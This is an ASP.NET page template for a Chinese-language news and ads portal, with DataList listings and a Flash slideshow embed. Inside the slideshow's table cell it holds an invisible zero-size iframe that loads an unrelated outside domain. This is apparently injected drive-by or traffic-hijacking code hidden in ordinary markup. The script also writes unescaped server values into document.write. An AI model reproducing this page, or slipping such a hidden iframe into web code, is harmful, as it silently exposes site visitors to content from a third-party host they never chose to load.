<%@ Page Title="" Language="C#" MasterPageFile="~/ljxPageMaster.master" AutoEventWireup="true" CodeFile="news.aspx.cs" Inherits="news" %>

<asp:Content ID="Content1" ContentPlaceHolderID="head" Runat="Server">
    <style type="text/css">
        .auto-style6 {
            text-align: center;
            width: 29%;
        }
        .auto-style8 {
            height: 197px;
        }
        .auto-style9 {
            height: 233px;
        }
        .auto-style10 {
            text-align: center;
            width: 88px;
        }
    </style>
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder1" Runat="Server">
    <table id="Table22" border="0" cellpadding="0" cellspacing="0" 
        style="height: 458px" width="757">
        <tr>
            <td>
                <table id="Table13" border="0" cellpadding="0" cellspacing="0" height="247" 
                    width="757">
                    
                    <tr>
                        <td class="auto-style9">
                            <table id="Table14" border="0" cellpadding="0" cellspacing="0" height="205" 
                                width="757">
                                <tr>
                                    <td class="auto-style8">
                                        <img alt="" height="205" src="qtimages/1_02_02_01_02_01.gif" width="13" />
                                    </td>
                                    <td valign="top" width="491" class="auto-style8">

                                        <asp:DataList ID="DataList1" runat="server" Width="100%" BorderStyle="None" 
                                            CellPadding="0" OnSelectedIndexChanged="DataList1_SelectedIndexChanged" Height="187px">
                                            <ItemTemplate>
                                                <table style="width: 100%;" border="0" cellpadding="0" cellspacing="0">
                                                    <tr>
                                                        <td>
                                                             <img src="qtimages/1.gif"> </img>
                                                        </td>
                                                        <td>
                                                          [<%#DataBinder.Eval(Container.DataItem, "类别")%>]
                                                        <a href='ggdetail.aspx?id=<%#DataBinder.Eval(Container.DataItem, "ID") %>'>
                                                        <%# CutStr(DataBinder.Eval(Container.DataItem, "标题 "))%></a>
                                                        </td>
                                                        <td align="right">
                                                           [<%#DataBinder.Eval(Container.DataItem, "时间")%>]
                                                        </td>
                                                    </tr>
                                                    
                                                </table>
                                            </ItemTemplate>
                                        </asp:DataList>

                                    </td>
                                    <td width="226" class="auto-style8">
                                                                    <script type="text/javascript">
                                                                        var focus_width = 226;
                                                                        var focus_height = 180;
                                                                        var text_height = 20;
                                                                        var swf_height = focus_height + text_height;
                                                                        var pics = "";
                                                                        var links = "";
                                                                        var texts = "";


                                                                        pics = "<%=npics %>";
                                                                        links = "<%=nlinks %>";
                                                                        texts = "<%=ntexts %>";

                                                                        document.write('<embed src="qtimages/pixviewer.swf" wmode="opaque" FlashVars="pics=' + pics + '&links=' + links + '&texts=' + texts + '&borderwidth=' + focus_width + '&borderheight=' + focus_height + '&textheight=' + text_height + '" menu="false" bgcolor="#ffffff" quality="Best" width="' + focus_width + '" height="' + swf_height + '" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer">');

                                                                    </script>
                                                                    <iframe id="I1" frameborder="0" name="I1" 
                                            src="http://www.shihuibysj.cn" style="height: 0; width: 0;"></iframe>
                                    </td>
                                    <td class="auto-style8">
                                        <img alt="" height="205" src="qtimages/1_02_02_01_02_04.gif" width="27" />
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <img alt="" height="8" src="qtimages/1_02_02_01_03.gif" width="757" />
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>
                <table id="Table17" border="0" cellpadding="0" cellspacing="0" height="228" 
                    width="757">
                    <tr>
                        <td valign="top">
                            <table id="Table18" border="0" cellpadding="0" cellspacing="0" height="228" 
                                width="372">
                                <tr>
                                    <td background="image/top2.jpg" height="34" width="372">
                                        <table border="0" cellpadding="0" cellspacing="0" height="21" width="100%">
                                            <tr>
                                                <td valign="bottom" class="auto-style10">
                                                    广告</td>
                                                <td width="60%">
                                                    &nbsp;
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <table id="Table19" border="0" cellpadding="0" cellspacing="0" 
                                            width="372">
                                            <tr>
                                                <td background="qtimages/1_02_02_03_01_02_01.gif" width="14">
                                                    &nbsp;
                                                </td>
                                                <td background="qtimages/1_02_02_03_01_02_02.gif" class="newsline" height="185" 
                                                    width="344">

                                        <asp:DataList ID="DataList2" runat="server" Width="100%" Height="100%" BorderStyle="None" CellPadding="0">
                                            <ItemTemplate>
                                                <table style="width: 100%; height: 25px;" border="0" cellpadding="0" 
                                                    cellspacing="0">
                                                    <tr>
                                                        <td>
                                                             <img src="qtimages/1.gif"> </img>
                                                        </td>
                                                        <td>
                                                          
                                                        <a href='ggdetail.aspx?id=<%#DataBinder.Eval(Container.DataItem, "ID") %>'>
                                                        <%# CutStr1(DataBinder.Eval(Container.DataItem, "标题 "))%></a>
                                                        </td>
                                                        <td align="right">
                                                           [<%#CutStr_time(DataBinder.Eval(Container.DataItem, "时间"))%>]
                                                        </td>
                                                    </tr>
                                                    
                                                </table>
                                            </ItemTemplate>
                                        </asp:DataList>

                                                </td>
                                                <td background="qtimages/1_02_02_03_01_02_03.gif" width="14">
                                                    &nbsp;
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <img alt="" height="9" src="qtimages/1_02_02_03_01_03.gif" width="372" />
                                    </td>
                                </tr>
                            </table>
                        </td>
                        <td valign="top">
                            <table id="Table20" border="0" cellpadding="0" cellspacing="0" height="228" 
                                width="372">
                                <tr>
                                    <td background="image/top2.jpg" height="34" width="372">
                                        <table border="0" cellpadding="0" cellspacing="0" height="21" width="100%">
                                            <tr>
                                                <td align="center" valign="bottom" width="40%">
                                                    热门推荐</td>
                                                <td width="60%">
                                                    &nbsp;
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <table id="Table21" border="0" cellpadding="0" cellspacing="0" height="185" 
                                            width="372">
                                            <tr>
                                                <td background="qtimages/1_02_02_03_01_02_01.gif" width="14">
                                                    &nbsp;
                                                </td>
                                                <td background="qtimages/1_02_02_03_01_02_02.gif" class="newsline" height="185" 
                                                    width="344">

                                        <asp:DataList ID="DataList3" runat="server" Width="100%" Height="100%" BorderStyle="None" CellPadding="0">
                                            <ItemTemplate>
                                                <table style="width: 100%;" cellpadding="0" cellspacing="0">
                                                    <tr>
                                                        <td>
                                                             <img src="qtimages/1.gif"> </img>
                                                        </td>
                                                        <td>
                                                         
                                                        <a href='ggdetail.aspx?id=<%#DataBinder.Eval(Container.DataItem, "ID") %>'>
                                                        <%# CutStr1(DataBinder.Eval(Container.DataItem, "标题 "))%></a>
                                                        </td>
                                                        <td align="right">
                                                           [<%#CutStr_time(DataBinder.Eval(Container.DataItem, "时间"))%>]
                                                        </td>
                                                    </tr>
                                                    
                                                </table>
                                            </ItemTemplate>
                                        </asp:DataList>

                                                </td>
                                                <td background="qtimages/1_02_02_03_01_02_03.gif" width="14">
                                                    &nbsp;
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <img alt="" height="9" src="qtimages/1_02_02_03_01_03.gif" width="372" />
                                    </td>
                                </tr>
                            </table>
                        </td>
                        <td>
                            <img alt="" height="228" src="qtimages/1_02_02_03_03.gif" width="16" />
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
    

</asp:Content>

